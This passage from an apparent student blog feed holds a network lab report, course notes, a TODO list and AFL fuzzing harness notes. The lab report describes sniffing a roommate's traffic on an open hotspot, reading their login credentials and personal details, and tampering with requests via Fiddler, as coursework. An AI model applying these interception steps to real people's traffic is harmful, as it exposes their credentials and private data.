src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p5.png"></p><p>观察其内容可知，寝室内校园网抓包结果与教室内一致。</p><p>1.3咖啡厅观察到的数据包</p><p>首先，确认我的IP地址</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p6.png"></p><p>收听一段时间后，如图：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p7.png"></p><p>其中有一段TCP握手过程：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p8.png"></p><p>查询该ip地址，35.244.128.0 发现是与谷歌云进行链接。</p><p>找到其他握手过程，分别查询ip<br>分别为：网易云，某香港ip，亚马逊云，等等。</p><p>再观察其HTTP协议包：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p9.png"><br>追踪之：<br><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p10.png"><br>可以发现这是一个图片的发送。</p><p>2.这三种数据的不同：</p><p>很显然，咖啡馆的数据包与另外两个相比，信息量更大，有很多TCP协议的握手等过程，以及一部分HTTP协议传输的数据。而链接校园网的寝室与教室，基本上只能接收到一些ARP包，没什么用处。</p><p>3.分辨pcap文件来源</p><p>目前，分辨有内网隔离的校园网来源的pcap与公开wifi的咖啡厅来源的pcap是比较容易的<br>但其他情况，就不能轻易下结论了。</p><h2 id="实验内容二："><a href="#实验内容二：" class="headerlink" title="实验内容二："></a>实验内容二：</h2><h3 id="实验要求：-1"><a href="#实验要求：-1" class="headerlink" title="实验要求："></a>实验要求：</h3><p>打开你的手机热点，不设置密码，用wireshark观察舍友通过你的手机上HTTP网站，登录学校门户，打开淘宝购物等过程，描述你能看到什么，不能看到什么。讲讲你作为信息安全专业人士，想到了什么？如果这台手机可以被你操控，比如对舍友的信息流注入点什么，那么你又能想到些什么呢？</p><h3 id="实验内容：-1"><a href="#实验内容：-1" class="headerlink" title="实验内容："></a>实验内容：</h3><p>开启热点进行抓包后，有一个HTTP包引起了注意：<br><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p11.png"></p><p>可以看到，从这个包内，我能轻松地找到登录时传入的用户名以及经过某种算法计算后的密码值。</p><p>由于HTTP明文传输，我也可以从对校内个人门户的访问过程中读到相关个人信息如下：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p12.jpg" alt="&quot;名字被暴露了&quot;"></p><p>以及学院、学号等信息</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p13.jpg"></p><p>还有我访问的页面–校园网流量使用情况中的数据：已使用 88.11G均可见</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p14.png"></p><p>可以看出，如果HTTP使用者不做任何加密措施（非协议层次的），通过HTTP协议传输的所有信息，都将完全可见可读，毫无隐私可言，对于敏感信息，更是危及信息安全。</p><p>如果我能操纵这个手机</p><p>可以进行改包，用fiddler软件进行包拦截，再将其中的数据修改，最后发送出去。</p><p>例如：</p><p>我搜索马云：</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p15.png"></p><p>利用fiddler 拦截、改包为马化腾后</p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p16.png"></p><p><img src="/2023/03/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80/p17.png"></p><p>发现我的搜索变成了马化腾。</p><p>当我能控制这个手机时同理，可以操纵相当一部分的数据流。（需要配置好一些参数，例如主机、端口号8888等，故真实场景内，利用其窃听较为容易，控制很难！）</p><p><strong>以上就是本次实验的全部内容</strong></p><h2 id="总结与心得"><a href="#总结与心得" class="headerlink" title="总结与心得"></a>总结与心得</h2><ul><li>通过这次实验，学会了用 wireshark 进行抓包分析，了解了 ARP HTTP TCP 等协议的执行流程，以及其包的结构。</li><li>通过查阅资料，学会了通过 QQ 电话来查询好友的 IP （无需接通，具体实现请移步个人博客 kawatsuki.com ），以及抓包、拦截、改包等一系列操作，深刻感受到，计算机网络我是可以参与的，过程性参与的。</li><li>最后，我认为信息安全事业任重道远，网络上很多数据都是透明的，通过 WIFI 抓包等手段，可以很容易地获取之，我们都是透明地无隐私地生活在这个网络社会上！</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TODO</title>
    <link href="/2023/03/21/TODO/"/>
    <url>/2023/03/21/TODO/</url>
    
    <content type="html"><![CDATA[<h1 id="TODO：（23-3-29-Wed-Week-6）"><a href="#TODO：（23-3-29-Wed-Week-6）" class="headerlink" title="TODO：（23.3.29 Wed Week 6）"></a>TODO：（23.3.29 Wed Week 6）</h1><p>联系方式</p><p>email：<a href="mailto:&#x6b;&#97;&#119;&#97;&#48;&#x32;&#x37;&#x73;&#x75;&#107;&#105;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#109;">&#x6b;&#97;&#119;&#97;&#48;&#x32;&#x37;&#x73;&#x75;&#107;&#105;&#64;&#x67;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#109;</a>  /  <a href="mailto:&#x66;&#99;&#50;&#x73;&#116;&#117;&#x64;&#x79;&#x40;&#104;&#x6e;&#x75;&#x2e;&#x65;&#x64;&#117;&#46;&#x63;&#x6e;">&#x66;&#99;&#50;&#x73;&#116;&#117;&#x64;&#x79;&#x40;&#104;&#x6e;&#x75;&#x2e;&#x65;&#x64;&#117;&#46;&#x63;&#x6e;</a></p><h2 id="vul337"><a href="#vul337" class="headerlink" title="vul337"></a>vul337</h2><ul><li><p>大组会：周四晚 6：30；</p></li><li><p>小组会 xfuzz ：周四中午 13：00 ~ 14：00；</p></li><li><p>跟进 xfuzz 项目；</p></li><li><p>每周日晚上/周一早上汇报周报</p></li><li><p>forkserver persistent mode 整合</p><ul><li><del>将 xfuzz 部署，运行</del>（done）</li><li>多查看源 AFL 及 ++ 代码，将目标部分搬运入项目<h2 id="course"><a href="#course" class="headerlink" title="course"></a>course</h2></li></ul></li><li><p>计网 </p><ul><li>进度：第三章开始；（3.19）</li><li>太上皇@计算机网络   实验二 1. 用任意编程语言，但<strong>不调用</strong>任何网络应用库或模块，直接使用socket编程，编写一个HTTP协议的爬虫，描写它支持的HTTP语法，并在超过1000个网站上进行测试，在报告里写一下你如何选择和编制网站列表，发现了什么现象，有什么统计规律，对观察到的互联网有什么看法？ 2. 用任意编程语言，编写网络爬虫，先后<strong>调用</strong>不少于5个网络应用库或模块，评测这些库支持的HTTP/HTTPS特性，并再找1000个网站进行测试，在报告里写一下你如何选择和编制网站列表，发现了什么现象，有什么统计规律，对观察到的互联网有什么看法？</li></ul></li><li><p>期中考试，第十周周二下午；（4.15下午3点到5点）</p><ul><li><del>实验一：观察不同层级的网络数据及其关联性</del> （done）</li></ul></li><li><p>实验二（4.9）前</p><ul><li>小班课，读15篇人工智能-计网相关论文，完成一个总结，人均2-3分钟。</li></ul></li><li><p>计算机系统</p><ul><li>小班 ： 双数周，周四早八；</li><li>CSAPP ：<del>第三章</del>；done（3.15）</li><li><del>第三章作业</del>（4.2）done</li><li><del>实验datalab</del> （done）</li></ul></li><li><p>操作系统</p><ul><li>期中考试（4.16下午3点到5点）</li><li><del>教材第 5 章课后问题 1、3、5、7</del>（done）</li></ul></li><li><p>创业</p><ul><li>第8周前，看看需要做什么，现在不清楚，慢慢水；</li><li>慕课需要水；</li></ul></li><li><p>电子平台</p><ul><li><del>3.12 ddl</del>；</li><li>这周三验收（3.29）</li></ul></li><li><p>毛概实践</p><ul><li>第八周前：读后感；</li></ul></li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul><li><p>关于闭源UAF检测；</p></li><li><p>hint：mmap + asan 原理；</p></li><li><p>无函数 c 语言实现 print “hello world”；</p></li><li><p><del>CET6 3月12日下午3：00  - 5：25</del>;</p></li><li><p>学院内的网络安全测试 </p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>schedule</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>datalab</title>
    <link href="/2023/03/21/datalab/"/>
    <url>/2023/03/21/datalab/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机系统实验二-Datalab-实验报告"><a href="#计算机系统实验二-Datalab-实验报告" class="headerlink" title="计算机系统实验二 Datalab 实验报告"></a>计算机系统实验二 Datalab 实验报告</h1><h1 id="1-实验目的："><a href="#1-实验目的：" class="headerlink" title="1.实验目的："></a>1.实验目的：</h1><ul><li>补充完整 bits.c 文件内容，完成实验；</li><li>了解机器中对整型、浮点数的存储方式；</li><li>熟悉位操作，完成一系列指令。</li></ul><h1 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2.实验准备"></a>2.实验准备</h1><ul><li>学习 CSAPP 书上的相关信息表示部分；</li><li>配置好虚拟机环境。</li></ul><h1 id="3-实验任务"><a href="#3-实验任务" class="headerlink" title="3.实验任务"></a>3.实验任务</h1><ul><li>补充完整 bits.c 文件内容，并利用 btest 程序进行测试。</li></ul><p>1.bitAnd </p><p>要求： 输出两个数按位与操作后的值。<br>实现：参数 x，y 分别按位取反后，进行或操作，最后再将结果取反即可（数学推导而成）</p><p>代码截图：<br><img src="/2023/03/21/datalab/p1.png"></p><p>2.getByte</p><p>要求：将整型数据 x 的第 n 个字节取出。<br>实现：直接将 x 右移 n*8 个位后，与 0xFF 进行与操作，取出最后一个字节即可。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p2.png"></p><p>3.logicalShift</p><p>要求：实现逻辑右移，由于 &gt;&gt; 为算术右移，需要实现负数的逻辑右移。<br>实现：将 x 算术右移 n 位后，与 <code>~(1 &lt;&lt; 31) &gt;&gt; n) &lt;&lt; 1)</code>进行与操作，这样可以使负数算术右移后，前面的一串 1 改为 0 ，达到逻辑右移的目的。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p3.png"></p><p>4.bitCount</p><p>要求：计算出x中有多少个1。<br>实现：计算出每两位中1的个数，用对应的两位进行存储，随后计算每四位中，再计算每8位，最后可得到结果。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p4.png"></p><p>5.bang</p><p>要求：不使用逻辑取反的情况下实现逻辑取反。<br>实现：用x或其负数，再右移31位取符号位+1即可。利用了x取反后，符号位均为1，除x == 0外的特性。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p5.png"></p><p>6.tmin</p><p>要求：输出最小的二进制补码。<br>实现：最小的二进制补码是0x80000000。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p6.png"></p><p>7.fitsBits</p><p>要求：给出一个数，判断x 是否能最少被 n 位表示。<br>实现：对于正数，若 x 右移 n -1 位（这一个是符号位，不可缺少），剩余的都是0，即可，对于负数，剩余的应该都是1。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p7.png"></p><p>8.divpwr2</p><p>要求：输出x除以2的n次幂后，向0取整的结果。<br>实现：正数直接右移n位即可，负数需进行调整。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p8.png"></p><p>9.negate</p><p>要求：实现取反。<br>实现：直接按位取反+1（取补码）即可。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p9.png"></p><p>10.isPositive</p><p>要求：判断 x 是否大于0；<br>实现：对 x == 0 单独讨论即可</p><p>代码截图：<br><img src="/2023/03/21/datalab/p10.png"></p><p>11.isLessOrEqual</p><p>要求：判断x是否小于等于y<br>实现：用y-x，判断符号位即可。</p><p>代码截图:<br><img src="/2023/03/21/datalab/p11.png"></p><p>12.ilog2</p><p>要求：求xlog2的值<br>实现：在这个实现中，我们首先将结果初始化为0。然后，我们使用位运算符逐步将结果设置为x的二进制表示中最高位1的位置。具体来说，我们首先检查x的高16位是否有1，如果有，则将结果的高4位设置为4。然后，我们将x右移结果的值，以便在下一步中检查剩余的位。我们重复这个过程，直到我们检查了x的所有位。最后，我们返回结果。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p12.png"></p><p>13.float_neg</p><p>要求：浮点数取反<br>实现：先将NaN直接返回无需操作，其余数据修改符号位即可。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p13.png"></p><p>14.float_i2f</p><p>要求：将int转换为float<br>实现：首先使用0x80000000获取x的符号位，如果x的符号位上是1，则求其补码。这一过程通过if判断实现。之后，通过while循环寻找除符号位外最高位1的位置，由于0x0和0x80000000去除符号位后对循环跳出条件有影响（会陷入死循环），故作为特殊边界值取出，单独做返回值。找到最高位1的位置后加上偏置量即可得到阶码的数值，再通过移位操作即可转移到指定的地方。对x进行左移操作，使32位中仅保留尾数相关的信息。取前23位作为尾数基础部分，后9位作为判断舍入的依据。若后9位不处于中间值则按照“大于进位，小于保留原状态”的方式处理。若处于中间值，则看23位的最后一位，如果它是1则选择“进位+1”，如果它是0则选择“保持原状态”。最后，整合各部分结果即可得到题目要求的结果。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p14.png"></p><p>15.float_twice</p><p>要求：浮点数乘二<br>实现：对于非规格化值，需要将尾数左移一位，若进位，阶码需+1。对于规格化值，阶码+1。特殊值直接返回本身就行。</p><p>代码截图：<br><img src="/2023/03/21/datalab/p15.png"></p><h2 id="检查是否违规："><a href="#检查是否违规：" class="headerlink" title="检查是否违规："></a>检查是否违规：</h2><p>dlc检查：<br><img src="/2023/03/21/datalab/p16.png"></p><p>btest检查：<br><img src="/2023/03/21/datalab/p17.png"></p><p>关于btest有一个项目没过关：是环境问题，0肯定可以用32位表示的。</p><h1 id="4-实验总结："><a href="#4-实验总结：" class="headerlink" title="4.实验总结："></a>4.实验总结：</h1><h2 id="实验中出现的问题："><a href="#实验中出现的问题：" class="headerlink" title="实验中出现的问题："></a>实验中出现的问题：</h2><ul><li>环境的差异性，导致有一个样例未能通过，但代码是没问题的。</li><li>虚拟机的不稳定性，虚拟机总是死机。</li></ul><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><ul><li>操作位是一个十分有意思的事情，利用有限的操作达成一个目的。</li><li>体会到更底层方面，仅用加法、位移这类操作实现计算机的艰难与智慧。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xfuzz</title>
    <link href="/2023/03/19/xfuzz/"/>
    <url>/2023/03/19/xfuzz/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机系统</title>
    <link href="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机系统"><a href="#计算机系统" class="headerlink" title="计算机系统"></a>计算机系统</h1><h2 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h2><h3 id="IEEE-浮点表示"><a href="#IEEE-浮点表示" class="headerlink" title="IEEE 浮点表示"></a>IEEE 浮点表示</h3><p>IEEE 浮点标准用 <code>V = (-1)^S X M X 2^E</code>来表示一个数：</p><ul><li>符号位：s 决定这个数为负数（ s = 1）或正数（s = 0）；</li><li>尾数： M 是一个二进制小数，其范围为 1 ~ 2 - 0，或  0 ~ 1 - 0；</li><li>阶码：E 的作用是对浮点数加权，为 2 的 E 次幂。</li></ul><p><strong>浮点数的位表示</strong><br>一个浮点数的位划分为三个字段，分别对这些值进行编码：</p><ul><li>第一个单独的符号位s直接编码s；</li><li>k 位的阶码字段 exp = … 编码 E；</li><li>n 位小数字段编码尾数 M 。</li></ul><p><strong>单精度字段分配</strong><br>s、exp、frac 字段分别为 1，8，23位；<br><strong>双精度字段分配</strong><br>s、exp、frac 字段分别为 1， 11， 52位。</p><p><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p1.png"></p><p><strong>规格化的值</strong></p><ul><li>exp 的位模式不全为0 也不全为1时。</li><li>阶码字段被解释为以偏置（biased）表示的有符号整数。即 E = e - Bias， e 是无符号数，Bias是 2^(k-1) - 1。（单精度 Bias 为127，双精度为 1023）</li><li>frac是小数值，取值是 [0 , 1)。</li><li>尾数定义为 <strong>M = 1 + f</strong>。</li></ul><p>举个例子：</p><p><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p2.png"></p><p>其过程：</p><ul><li>先化为二进制；</li><li>然后数最高位的阶E；</li><li>阶码 exp = E + Bias（127或1023）；</li><li>阶码 exp 化为二进制；</li><li>将原二进制数中第一个1去除后，将剩下部分补入尾数，右侧补0补齐。</li></ul><p><strong>非规格化值</strong></p><ul><li>exp全为0；</li><li>阶码 E = 1 - Bias （ 为了非规格化与规格化值之间平滑过渡）</li><li>尾数 <strong>M = 0.xxxxxxx</strong></li></ul><p>如：</p><ul><li>exp = 000000..0，frac = 000000..00，此时值为0，符号位决定 +，- 0；</li><li>exp = 000000..0，frac != 000000..00，此时为非常接近0的数。</li></ul><p><strong>特殊值</strong><br>判断条件：exp = 全1；</p><ul><li>exp = 全1，frac = 全0：表示无穷大，符号位决定正无穷或负无穷。</li><li>exp = 全1，frac 不是全0；表示这不是一个数。</li></ul><p>总结如下：<br><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p3.png"></p><p><strong>舍入</strong></p><p>向偶数舍入，即1.4会舍入为1，1.6舍入为2，<strong>1.5舍入为2，-1.5舍入为-2</strong>，使最低有效位为偶数。<br>二进制小数舍入：<br>若需要舍入至小数点后2位，先看第三位及以后，是否为中间值，即仅仅第三位为1，后面位全为0。<br>若是中间值，将第二位舍入为0，不是中间值，去向更靠近的一方。</p><p><strong>浮点数运算</strong><br><img src="/2023/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/p4.png"></p><p>即</p><ul><li>符号位亦或<code>^</code></li><li>尾数相乘</li><li>阶码E相加</li></ul><p>若</p><ul><li>M &gt;= 2 ， M 右移一位，E = E + 1</li><li>若 E 超出范围，溢出</li><li>将 M 舍入到 frac 的位数范围。</li></ul><h1 id="第三章-程序的机器级执行"><a href="#第三章-程序的机器级执行" class="headerlink" title="第三章 程序的机器级执行"></a>第三章 程序的机器级执行</h1><ul><li>mov系列指令：</li><li>movb/w/l：移动字节、字、双字</li><li>movsbw：符号拓展后，字节移动到字。</li><li>movzbw：零拓展后，字节移动到字。</li></ul><p>imull/mull<br>要求其中一个操作数在eax中，调用如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">imull</span> <span class="hljs-number">8</span>(%ebp)<br></code></pre></td></tr></table></figure><p>即最后一个参数与eax中的值相乘，乘积存放在寄存器 edx （高32位）和 eax（低32位）中。</p><p>cltd指令：将被除数拓展到 edx，eax 中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">movl <span class="hljs-number">8</span>(%ebp),%eax <span class="hljs-regexp">//</span> load x<br>cltd <span class="hljs-regexp">//</span> extend into edx<br>idivl <span class="hljs-number">12</span>(%ebp) <span class="hljs-regexp">//</span> divide by y<br></code></pre></td></tr></table></figure><p>条件码寄存器：<br>CF : 进位标志。最高位产生进位，无符号数溢出；<br>ZF : 零标志。最近操作结果为0；<br>SF : 符号标志。最近操作结果为负；<br>OF : 溢出标志。最近操作补码溢出。</p><p>lea 指令不会改变任何条件码。</p><p>cmp 指令： 只改变条件码，除此之外，其与 SUB 指令完全一样。<br>test 指令：只改变条件码，其他操作与 AND 一样。</p>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Persistent Mode</title>
    <link href="/2023/03/14/Persistent-Mode/"/>
    <url>/2023/03/14/Persistent-Mode/</url>
    
    <content type="html"><![CDATA[<h1 id="Forkserver-Persistent-Mode"><a href="#Forkserver-Persistent-Mode" class="headerlink" title="Forkserver Persistent Mode"></a>Forkserver Persistent Mode</h1><h2 id="Persistent-Mode"><a href="#Persistent-Mode" class="headerlink" title="Persistent Mode"></a>Persistent Mode</h2><p>AFL 中采用 Forserver 来加快程序运行效率，其原理是利用 Forkserver 机制 fork() 出子程序进行执行，取代了 execve() 的执行模式，避免了大量重复的链接等操作，大大提升了 Fuzz 的速率。</p><p>进一步看，由于某些库提供的 API 是无状态的，或能重置其状态，在一次次循环之间。当 API 重置后，一个长期活跃的进程就可以被重复使用，这样可以消除 fork() 函数以及 OS 相关的消耗。</p><p>通常，Persistent Mode 下，程序可有 x10 ~ x20 倍的速率提升。</p><h3 id="使用-Persistent-Mode"><a href="#使用-Persistent-Mode" class="headerlink" title="使用 Persistent Mode"></a>使用 Persistent Mode</h3><p>使用 Persistent Mode 很简单，只需要修改 target 程序为一个确定的模式即可</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;what_you_need_for_your_target.h&quot;</span></span><br><span class="hljs-comment">//引用有目标无状态 API 的库</span><br>__AFL_FUZZ_INIT();<br><br>main() &#123;<br><br>  <span class="hljs-comment">// anything else here, e.g. command line arguments, initialization, etc.</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __AFL_HAVE_MANUAL_CONTROL</span><br>  __AFL_INIT();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf = __AFL_FUZZ_TESTCASE_BUF;  <span class="hljs-comment">// must be after __AFL_INIT</span><br>                                                 <span class="hljs-comment">// and before __AFL_LOOP!</span><br><br>  <span class="hljs-keyword">while</span> (__AFL_LOOP(<span class="hljs-number">10000</span>)) &#123;<br><br>    <span class="hljs-type">int</span> len = __AFL_FUZZ_TESTCASE_LEN;  <span class="hljs-comment">// don&#x27;t use the macro directly in a</span><br>                                        <span class="hljs-comment">// call!</span><br><br>    <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">8</span>) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// check for a required/useful minimum input length</span><br><br>    <span class="hljs-comment">/* Setup function call, e.g. struct target *tmp = libtarget_init() */</span><br>    <span class="hljs-comment">/* Call function to be fuzzed, e.g.: */</span><br>    target_function(buf, len);<br>    <span class="hljs-comment">/* Reset state. e.g. libtarget_free(tmp) */</span><br><br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>以下为两个例子<br>对 capstone 进行 fuzz</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;capstone/include/capstone.h&quot;</span> <span class="hljs-comment">// 引用capstone内无状态库</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br>    csh handle;<br>    cs_insn *insn;<br>    <span class="hljs-type">size_t</span> count;<br>    <span class="hljs-type">uint8_t</span> buf[<span class="hljs-number">128</span>]; <br>    <span class="hljs-type">ssize_t</span> read_bytes;<br><br>    <span class="hljs-keyword">while</span> (__AFL_LOOP(<span class="hljs-number">1000</span>)) &#123;<br>        <span class="hljs-comment">// (re-) initialize the library and read new input</span><br>        read_bytes = <span class="hljs-number">-1</span>; <br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>);<br>        read_bytes = read(STDIN_FILENO, buf, <span class="hljs-number">128</span>);<br><br>        <span class="hljs-keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle) == CS_ERR_OK) &#123;<br>            <span class="hljs-comment">// disassemble the bytes we just read using capstone</span><br>            count = cs_disasm(handle, buf, read_bytes, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0</span>, &amp;insn);<br><br>            <span class="hljs-comment">// Don&#x27;t leak memory. This is especially important in persistent mode, </span><br>            <span class="hljs-comment">// because we reuse the process a significant number of times</span><br>            cs_free(insn, count); <br>        &#125;<br>        cs_close(&amp;handle);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对某程序进行 fuzz</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ft2build.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> FT_FREETYPE_H</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span>&#123;<br>    FT_Library lib = <span class="hljs-literal">NULL</span>;<br>    FT_Face face = <span class="hljs-literal">NULL</span>;<br>    FT_Init_FreeType(&amp;lib);<br><br>    <span class="hljs-keyword">while</span>(__AFL_LOOP(<span class="hljs-number">1000</span>)) &#123;<br>        face = <span class="hljs-literal">NULL</span>;<br>        FT_New_Face(lib, argv[<span class="hljs-number">1</span>], <span class="hljs-number">0</span>, &amp;face);<br>        FT_Done_Face(face);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>**注意：重置状态时应尽力避免 memory leak **</p><h3 id="AFL-LOOP"><a href="#AFL-LOOP" class="headerlink" title="__AFL_LOOP"></a>__AFL_LOOP</h3><p>_AFL_LOOP 的宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code 